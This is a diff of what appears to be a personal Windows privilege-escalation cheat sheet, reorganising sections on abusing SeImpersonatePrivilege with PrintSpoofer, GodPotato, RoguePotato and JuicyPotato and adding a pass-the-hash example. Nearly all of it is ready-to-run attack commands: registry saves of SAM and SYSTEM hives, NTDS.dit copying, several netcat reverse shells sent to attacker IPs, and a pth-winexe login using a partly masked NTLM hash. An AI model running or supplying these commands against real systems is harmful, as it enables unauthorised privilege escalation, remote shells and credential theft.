@@ -352,7 +352,8 @@ Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
 reg save HKLM\SYSTEM system
 reg save HKLM\SAM sam
 ```
-### Named Pipes(PrintSpoofer)
+### Abuse SeImpersonatePrivilege
+Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
 Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
@@ -361,9 +362,7 @@ victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 
 whoami
 ```
-### Godpotato
-ImpersonatePrivilege permission required  
-Windows Server 2012 - Windows Server 2022, Windows 8 - Windows 11
+Godpotato
 ```
 GodPotato-NET4.exe
 GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.102(LHOST) 2012(LPORT)"
@@ -384,23 +383,23 @@ Check .Net Version
 Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
 reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
 ```
-![image](https://github.com/user-attachments/assets/cae43a79-e6ba-4c1a-9294-0947fc636b3c)
+![image](https://github.com/user-attachments/assets/cae43a79-e6ba-4c1a-9294-0947fc636b3c)  
 
-### Rogue Potato
-ImpersonatePrivilege permission required
+Rogue Potato
 ```
 RoguePotato.exe -r 10.10.10.3(LHOST) -e "nc.exe 10.10.10.3 3001 -e cmd.exe" -l 9999
 # In some old versions you need to use the "-f" param
 RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 
 nc.exe -nlvp 3001
+
+RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999
 ```
-### JuicyPotato
-SeImpersonatePrivilege Impersonate a client after authentication Enabled + Windows Serverr 2008 Standard = JuicyPotato  
-SeImpersonate or SeAssignPrimaryToken privileges Required  
+JuicyPotato  
 Visit https://ohpe.it/juicy-potato/CLSID/ for a list of CLSIDs to try.
 ```
 JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}/{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe -e cmd.exe 192.168.45.219 4444" -t *
+JuicyPotatoNG.exe -t * -p "shell.exe" -a
 ```
 ### Token Abuse
 Tips: Always try cmd.exe with admin rights to check for more priv  
@@ -577,6 +576,11 @@ dir /AH (display hidden files)
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
 #Check writable permissions and transfer
 #The only catch here is the system needs to be restarted
+```
+### Pass the Hash
+```
+#If hashes are obtained through some means, then use psexec and smbexec and obtain the shell as a different user.
+pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
 ```
 ### Basic Process Injection
 basic.cpp
